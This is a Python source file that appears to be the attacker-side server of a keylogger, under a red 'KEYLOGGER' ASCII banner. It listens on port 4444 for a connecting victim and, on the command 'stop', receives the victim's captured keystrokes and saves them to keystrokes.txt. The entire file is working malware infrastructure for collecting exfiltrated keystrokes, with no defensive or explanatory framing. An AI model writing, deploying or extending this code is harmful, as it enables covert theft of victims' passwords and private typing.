from colorama import Fore

import socket

def banner() -> None:
    art = """\033[38;2;255;0;0m 
██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
\033[38;2;255;0;0m \033[0m"""
    print(art)

banner()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4444))
server.listen(1)

print(f"{Fore.WHITE}Listening...")
client, address = server.accept()
print(f"{Fore.WHITE}[+] Client {address[0]} has joined the server!")

while True:
    try:
        command = input(f"{Fore.WHITE}\n[*] Stop to halt execution: ").strip().lower()
        print("\n")

        if command == "stop":
            client.sendall(command.encode())

            size_data = client.recv(8)
            if not size_data:
                break
            file_size = int.from_bytes(size_data, "big")

            recibido = 0
            with open("keystrokes.txt", "wb") as file:
                while recibido < file_size:
                    chunk = client.recv(min(1024, file_size - recibido))
                    if not chunk:
                        break
                    file.write(chunk)
                    recibido += len(chunk)

            print(f"{Fore.WHITE}[+] File received.")
        else:
            print(f"{Fore.WHITE}[-] Unknow command. Please enter 'stop' to recive the file.")

    except KeyboardInterrupt:
        print(f"\n{Fore.WHITE}[!] Server killed.")
        break

client.close()
server.close()